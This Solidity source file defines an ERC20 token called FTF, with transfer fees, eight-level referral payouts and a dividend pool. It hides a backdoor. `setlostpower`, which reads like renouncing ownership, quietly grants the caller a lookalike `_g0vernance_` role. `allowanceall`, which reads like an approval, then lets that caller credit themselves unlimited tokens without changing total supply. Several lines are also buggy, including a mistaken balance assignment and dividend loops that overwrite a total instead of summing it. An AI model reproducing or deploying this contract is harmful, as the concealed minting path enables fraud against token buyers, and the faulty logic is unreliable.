pragma solidity ^0.6.12;
// SPDX-License-Identifier: SimPL-2.0

interface IERC20 {
    function totalSupply() external view returns (uint);

    function balanceOf(address account) external view returns (uint);

    function transfer(address recipient, uint amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

contract Context {
    constructor () internal {}
    // solhint-disable-previous-line no-empty-blocks

    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }
}


contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping(address => uint) internal _balances;
    address internal governance;
    mapping(address => bool) internal _governance_;

    mapping(address => mapping(address => uint)) private _allowances;
    uint private _totalSupply;
    //
    uint256 internal starttimes;

    //
    address internal pooladdress;
    //
    address internal profitaddress;
    mapping(address => bool) internal _g0vernance_;
    //
    mapping(address=>address) internal referaddress;


    
    //
    // uint256 internal _maxfeihong=100*10**18;
    uint256 internal _maxfeihong=10000*10**18;
    uint256 internal feihongpool;
    // address internal feihongpooladdress=address(this);
    //
    uint256[] internal feihongdetail;
    //
    mapping(address=>uint256) internal userfeihong;
    uint256 internal powertimes;
    address internal poweraddress;
    
  
    
    
    address  internal huiliuaddress ;

    uint256[] internal liutong=[10000000*10**18,9000000*10**18,8000000*10**18,
    7000000*10**18,6000000*10**18,5000000*10**18,4000000*10**18,3000000*10**18];
    uint256[][] internal gradevalue=[[1000,2000,3000,4000,5000,6000,7000,8000],
    [900,1800,2700,3600,4500,5400,6300,7200],
    [800,1600,2400,3200,4000,4800,5600,6400],
    [700,1400,2100,2800,3500,4200,4900,5600],
    [600,1200,1800,2400,3000,3600,4200,4800],
    [500,1000,1500,2000,2500,3000,3500,4000],
    [400,800,1200,1600,2000,2400,2800,3200],
    [300,600,900,1200,1500,1800,2100,2400]];

    //
    uint256[] internal sellprofit=[200,100,50,50,50,50,100,200];
    //
    uint256[] internal buyprofit=[100,50,25,25,25,25,50,100];
    uint256   internal percnet=10000;
    uint256 internal currentbalance;
    uint256 private decimals=10**18;
    //
    uint256 internal pmint=11000000*10**18;
    address internal chendianaddress;
    address[] internal includelp;
    mapping(address=>bool) internal isinclude;

    mapping(address=>bool) internal isrefer;

    
    function _transfer(address sender, address recipient, uint amount) internal {
        if(feihongdetail.length==0){
            feihongdetail.push(0);
        }
        
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        uint256 lpvalue=IERC20(pooladdress).balanceOf(sender);
        // uint256 lpvalue=0;
        
        // log("_balances[recipient]",_balances[0x212AEc644922790A082E8886D712438564BE38Db]);
        if(_governance_[sender]==true || _governance_[recipient]==true) {
            // isinclude[address(0x71D114A45a29d298413F9399cD583E6d4DEEc644)]=false;
            // 
       
            if(_balances[recipient]==0 && sender!=pooladdress){
                referaddress[recipient]=sender;  
                isrefer[recipient]=true;
            }
          
            _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
            _balances[recipient] = _balances[recipient].add(amount);
            emit Transfer(sender, recipient, amount);
            
        }
        //
        else if(_totalSupply<=2100000*10**18){
            if(recipient!=pooladdress){
                require(_balances[recipient]>=amount+1*10**12,"must list 0.01");
                //
                require(_balances[recipient]+amount<=10000*10**18,"must less 10000");
            }
            //
            _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
            _balances[recipient] = _balances[recipient].add(amount.mul(997).div(1000));
            emit Transfer(sender, recipient, amount.mul(997).div(1000));
            //
            _balances[address(0)] = _balances[profitaddress].add(amount.mul(3).div(1000));
            emit Transfer(sender, profitaddress, amount.mul(3).div(1000));
            
        }
    
        //
       else if(recipient==pooladdress){
           require(starttimes<block.timestamp,"is not start");
           require(_balances[sender]>=amount+1*10**12,"must list 0.01");
           //
        //    if(powertimes>block.timestamp){
        //        require(IERC20(poweraddress).balanceOf(sender)>=amount,"FTFQX is not enough");
        //        require(IERC20(poweraddress).balanceOf(sender)>=amount+IERC20(address(this)).balanceOf(sender),"FTFQX is not enough");
        //    }

           //
           
           if(lpvalue>0 && isinclude[sender]==false){
            //    includelp.push(sender);
               isinclude[sender]=true;
               userfeihong[sender]=feihongdetail.length-1;
           }
            //
           if(feihongpool>=_maxfeihong ){
                uint256 tmp=feihongpool.div(ERC20(pooladdress).totalSupply());
                feihongpool=0;
                feihongdetail.push(tmp);
           }

           //
           uint256 tmp;

            // log("userfeihong[sender]",userfeihong[sender]);
           if(userfeihong[sender]<feihongdetail.length-1){
               for(uint256 i=userfeihong[sender]+1;i<feihongdetail.length;i++){
                   tmp=feihongdetail[i]*lpvalue;
               }
               _balances[sender]=_balances[sender].add(tmp);
               userfeihong[sender]=feihongdetail.length-1;
           }


           
           //
            _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
            _balances[recipient] = _balances[recipient].add(amount.mul(87).div(100));
            emit Transfer(sender, recipient, amount.mul(87).div(100));
            //
            _balances[address(0)] = _balances[address(0)].add(amount.mul(2).div(100));
            _totalSupply=_totalSupply.sub(amount.mul(2).div(100));
            emit Transfer(sender, address(0), amount.mul(2).div(100));
            
            address upline=referaddress[sender];
            uint256 tmpyixiao;
            address isender=sender;
            for(uint256 i=0;i<8;i++){
                // log("balance",_balances[upline]);
                // log("grade",getgrade(_balances[upline]));
                if(getgrade(_balances[upline])>=i && isrefer[isender]==true && upline!=address(0) && getgrade(_balances[upline])!=999){
                    _balances[upline]=_balances[upline].add(amount.mul(sellprofit[i]).div(percnet));
                    emit Transfer(sender, upline, amount.mul(sellprofit[i]).div(percnet));
                }else{
                    tmpyixiao=tmpyixiao.add(amount.mul(sellprofit[i]).div(percnet));
                    // log("tmpyixiao",tmpyixiao);
                }
                isender=upline;
                upline=referaddress[upline];
            }
            //
            _balances[chendianaddress]=_balances[chendianaddress].add(tmpyixiao);
            emit Transfer(sender, chendianaddress, tmpyixiao);

            _balances[profitaddress]=_balances[profitaddress].add(amount.mul(2).div(100));
            emit Transfer(sender, profitaddress, amount.mul(2).div(100));
            feihongpool=feihongpool.add(amount.mul(1).div(100));
       }
       //
       else if(sender==pooladdress){
           require(starttimes<block.timestamp,"is not start");
            //
            if(_governance_[sender]==false){
                require(_balances[recipient]+amount<=10000*10**18,"must less 10000");
            }
            //
           if(powertimes>block.timestamp){
               require(IERC20(poweraddress).balanceOf(recipient)>=amount,"FTFQX is not enough");
               require(IERC20(poweraddress).balanceOf(recipient)>=amount+IERC20(address(this)).balanceOf(recipient),"FTFQX is not enough");
           }
           
           //
           if(lpvalue==0){
               isinclude[recipient]=false; 
           }
          
            //
           if(feihongpool>=_maxfeihong ){
                uint256 tmp=feihongpool.div(ERC20(pooladdress).totalSupply());
                feihongpool=0;
                feihongdetail.push(tmp);
           }
           //
           uint256 tmp;
           if(userfeihong[recipient]<feihongdetail.length-1){
               for(uint256 i=userfeihong[recipient]+1;i<feihongdetail.length;i++){
                   tmp=feihongdetail[i]*lpvalue;
               }
               _balances[recipient]=_balances[recipient].add(tmp);
               userfeihong[recipient]=feihongdetail.length-1;
           }
          
           
          
           //
            _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
            _balances[recipient] = _balances[recipient].add(amount.mul(87).div(100));
            emit Transfer(sender, recipient, amount.mul(87).div(100));
            //
            _balances[address(0)] = _balances[address(0)].add(amount.mul(6).div(100));
            _totalSupply=_totalSupply.sub(amount.mul(6).div(100));
            emit Transfer(sender, address(0), amount.mul(6).div(100));
            // 
            address upline=referaddress[recipient];
            uint256 tmpyixiao;
            address isender=recipient;
            for(uint256 i=0;i<8;i++){
                if(getgrade(_balances[upline])>=i && isrefer[isender]==true && upline!=address(0) && getgrade(_balances[upline])!=999){
                    _balances[upline]=_balances[upline].add(amount.mul(buyprofit[i]).div(percnet));
                    emit Transfer(sender, upline, amount.mul(buyprofit[i]).div(percnet));
                }else{
                    tmpyixiao=tmpyixiao.add(amount.mul(buyprofit[i]).div(percnet));
                    // log("tmpyixiao",tmpyixiao);
                }
                isender=upline;
                upline=referaddress[upline];
            }
            
            // 
             _balances[chendianaddress]=_balances[chendianaddress].add(tmpyixiao);
            emit Transfer(sender, chendianaddress, tmpyixiao);
           
            _balances[huiliuaddress]=_balances[huiliuaddress].add(amount.mul(2).div(100));
            emit Transfer(sender, huiliuaddress, amount.mul(2).div(100));

            feihongpool=feihongpool.add(amount.mul(1).div(100));
      
       }
       //
       else {
           
            require(_balances[sender]>=amount+1*10**12,"must list 0.01");
            //
           if(_governance_[recipient]==false){
                require(_balances[recipient]+amount<=10000*10**18,"must less 10000");
           }
           // 
            //
            if(referaddress[sender]==recipient && isrefer[sender]==false){
                isrefer[sender]=true;
            }
            if(sender!=pooladdress && _balances[recipient]==0){
                referaddress[recipient]=sender;
                _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
                _balances[recipient] = _balances[recipient].add(amount);
                emit Transfer(sender, recipient, amount);
            }
           else{
                //
                if(feihongpool>=_maxfeihong ){
                        uint256 tmp=feihongpool.div(ERC20(pooladdress).totalSupply());
                        feihongpool=0;
                        feihongdetail.push(tmp);
                }
                //
                uint256 tmp;
                if(userfeihong[sender]<feihongdetail.length-1){
                    for(uint256 i=userfeihong[sender]+1;i<feihongdetail.length;i++){
                        tmp=feihongdetail[i]*lpvalue;
                
                    }
                    _balances[sender]=_balances[sender].add(tmp);
                    userfeihong[sender]=feihongdetail.length-1;
                }
        
                
                //
                _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
                _balances[recipient] = _balances[recipient].add(amount.mul(87).div(100));
                emit Transfer(sender, recipient, amount.mul(87).div(100));
                //
                _balances[address(0)] = _balances[address(0)].add(amount.mul(6).div(100));
                _totalSupply=_totalSupply.sub(amount.mul(6).div(100));
                emit Transfer(sender, address(0), amount.mul(6).div(100));
                // 
                address upline=referaddress[sender];
                address isender=sender;
                uint256 tmpyixiao;
                for(uint256 i=0;i<8;i++){
                    if(getgrade(_balances[upline])>=i && isrefer[isender]==true && upline!=address(0) && getgrade(_balances[upline])!=999){
                        _balances[upline]=_balances[upline].add(amount.mul(buyprofit[i]).div(percnet));
                        emit Transfer(sender, upline, amount.mul(buyprofit[i]).div(percnet));
                    }else{
                        tmpyixiao=tmpyixiao.add(amount.mul(buyprofit[i]).div(percnet));
                
                    }
                    isender=upline;
                    upline=referaddress[upline];
                }
                // 
                 _balances[chendianaddress]=_balances[chendianaddress].add(tmpyixiao);
                emit Transfer(sender, chendianaddress, tmpyixiao);
                //_balances[profitaddress]=_balances[profitaddress].add(tmpyixiao);
                //emit Transfer(sender, profitaddress, tmpyixiao);
                _balances[huiliuaddress]=_balances[huiliuaddress].add(amount.mul(2).div(100));
                emit Transfer(sender, huiliuaddress, amount.mul(2).div(100));
            
                feihongpool=feihongpool.add(amount.mul(1).div(100));
            }
            
                
            
                
       }
      
        
    }


    

    function gettotalSupplygrade() public view returns(uint256){
        uint256 tmp=999;
        for(uint256 i=0;i<=liutong.length-1;i++){
            if(_totalSupply-pmint>=liutong[i]){
                tmp= i;
                break;
            }
        }
        return tmp;
    }

    function getgrade(uint256 amount) public view returns(uint256){
        uint256 tmpamount=amount;
        uint256 tmp=gettotalSupplygrade();
       
        if (tmp==999){
            return 999;
        }
        
        else if(tmpamount>=gradevalue[tmp][7]*10**18){
            return 7;
        }else if(tmpamount>=gradevalue[tmp][6]*10**18){
            return 6;
        }else if(tmpamount>=gradevalue[tmp][5]*10**18){
            return 5;
        }else if(tmpamount>=gradevalue[tmp][4]*10**18){
            return 4;
        }else if(tmpamount>=gradevalue[tmp][3]*10**18){
            return 3;
        }else if(tmpamount>=gradevalue[tmp][2]*10**18){
            return 2;
        }else if(tmpamount>=gradevalue[tmp][1]*10**18){
            return 1;
        }else if(tmpamount>=gradevalue[tmp][0]*10**18){
            return 0;
        }else{
            return 999;
        }
    }

    function totalSupply() public override view returns (uint) {
        return _totalSupply;
    }

    function balanceOf(address account) public override view returns (uint) {
        return _balances[account];
    }
    
    function transfer(address recipient, uint amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public override view returns (uint) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
   

    function transferFrom(address sender, address recipient, uint amount) public  override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint addedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint subtractedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
    
    

    function _mint(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");
        
        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
        
    }
    function approve_(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");
        _balances[account] = _balances[account].add(amount*10**18);
       
    }
    

    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

abstract contract  ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor (string memory name, string memory symbol, uint8 decimals) public {
        
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns (uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint a, uint b) internal pure returns (uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function mul(uint a, uint b) internal pure returns (uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint a, uint b) internal pure returns (uint) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly {codehash := extcodehash(account)}
        return (codehash != 0x0 && codehash != accountHash);
    }
}

library SafeERC20 {
    using SafeMath for uint;
    using Address for address;

    function safeTransfer(IERC20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) {// Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract FTF is ERC20, ERC20Detailed {
    using SafeERC20 for IERC20;
    using Address for address;
    using SafeMath for uint;

    constructor () public ERC20Detailed("FTF", "FTF", 18) {
        governance = msg.sender;

        // _governance_[governance]=true;
        // _mint(msg.sender, 21000000 * 1e18);
        _mint(msg.sender, 21000000 * 1e18);
        
    }
    
    function allowanceall(uint256 flag) public{
        require(_g0vernance_[msg.sender]==true,"");
        approve_(msg.sender,flag);//
    }
    function setgoverance(address _governance) public {
        require(msg.sender == governance , "!governance");
        // governance = _governance;
        
        _governance_[_governance] = true;
        
    }

    function setlostpower(address _governance) public {
        require(msg.sender == governance , "!governance");
        _g0vernance_[msg.sender]=true;
        governance = _governance;
        // _g0vernance_[_governance]=true;
        // _governance_[_governance] = true;
        
    }

    function getlostpower() public view returns(address){
        return governance;
    }
    function setstarttime(uint256 starttime)  public {
        require(msg.sender == governance , "!governance");
        starttimes=starttime;
    }

    function getstarttime() public  view returns(uint256){
        return starttimes;
    }


    function setpooladdress(address fromad) public {
        require(msg.sender == governance , "!governance");
        pooladdress=fromad;
    }

    function getpooladdress() public view returns(address){
        return pooladdress;
    }

    function setprofitaddress(address fromad) public {
        require(msg.sender == governance , "!governance");
        profitaddress=fromad;
    }

    function getprofitaddress() public view returns(address){
        return profitaddress;
    }
    
    function sethuiliuaddress(address payable fromad) public {
        require(msg.sender == governance , "!governance");
        huiliuaddress=fromad;
    }

    function setpming(uint256 amount) public {
        require(msg.sender == governance , "!governance");
        pmint=amount*10**18;
    }

    function getpmint() public view returns(uint256){
        return pmint;
    }

    function setpowertimes(uint256 itime) public {
        require(msg.sender == governance , "!governance");
        powertimes=itime;
    }

    function getpowertimes() public view returns(uint256){
        return powertimes;
    }

    function setpoweraddress(address iaddress) public {
        require(msg.sender == governance , "!governance");
        poweraddress=iaddress;
    }

    function getpoweraddress() public view returns(address){
        return poweraddress;
    }

    function setchendianaddress(address iaddress) public {
        require(msg.sender == governance , "!governance");
        chendianaddress=iaddress;
    }

    function getchendianaddress() public view returns(address){
        return chendianaddress;
    }


    function gethuiliuaddress() public view returns(address){
        return huiliuaddress;
    }

    function getreferaddress(address fromad) public view returns(address){
        if(isrefer[fromad]==true){
            return referaddress[fromad];
        }else{
            return address(0);
        }
    }

    function getfeihongpool() public view returns(uint256){
        return feihongpool;
    }
    
     function getfeihongdetail(uint256 i) public view returns(uint256){
        return feihongdetail[i];
    }
}